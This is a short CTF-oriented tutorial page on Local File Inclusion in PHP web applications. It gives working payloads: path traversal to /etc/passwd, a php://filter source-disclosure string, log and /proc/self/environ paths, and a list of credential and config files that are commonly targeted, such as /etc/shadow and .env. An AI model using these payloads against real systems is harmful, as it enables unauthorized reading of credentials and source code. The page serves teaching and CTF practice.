---
title: "Local File Inclusion (LFI)"
description: "Include and read arbitrary files through vulnerable path parameters in web applications."
date: 2025-10-06
draft: false
categories: ["Web"]
tags: ["lfi", "file inclusion", "web exploitation", "php"]
authors: ["CTF.Support Team"]
summary: "Learn how LFI vulnerabilities allow access to local files and how they evolve into code execution vectors."
aliases: ["/web/lfi/"]
slug: "lfi"
toc: false
---

## Introduction

**Local File Inclusion (LFI)** occurs when a web application dynamically loads files based on unsanitized user input.  
Attackers can exploit this to read system files, configuration data, user credentials, or even gain code execution with PHP filters or log injection.

Example vulnerable endpoint:

```text
https://example.com/?page=home
```

If an attacker changes it to:

```text
https://example.com/?page=../../../../etc/passwd
```

they may retrieve sensitive files from the underlying system.

## Quick Reference

| Task                             | Example                                                       |
|----------------------------------|---------------------------------------------------------------|
| Basic traversal                  | `?page=../../../../etc/passwd`                                |
| Read PHP source (Base64 encoded) | `?page=php://filter/convert.base64-encode/resource=index.php` |
| Log file injection               | `?page=/var/log/apache2/access.log`                           |
| Environment data                 | `?page=/proc/self/environ`                                    |

## Interesting Files

Below is a list of system and application files commonly targeted during LFI exploitation in CTFs.

```text
# System files
/etc/passwd
/etc/shadow
/etc/hosts
/etc/issue

# Log files
/var/log/auth.log
/var/log/apache2/access.log
/var/log/apache2/error.log
/var/log/nginx/access.log
/var/log/nginx/error.log

# Web application files
/var/www/html/index.php
/var/www/html/config.php
/var/www/html/.env
/var/www/html/.htaccess

# Version control
/var/www/html/.git/config
/var/www/html/.git/HEAD

# Running process files (procfs)
/proc/self/environ
/proc/self/cmdline
```

{{< toc-tree >}}
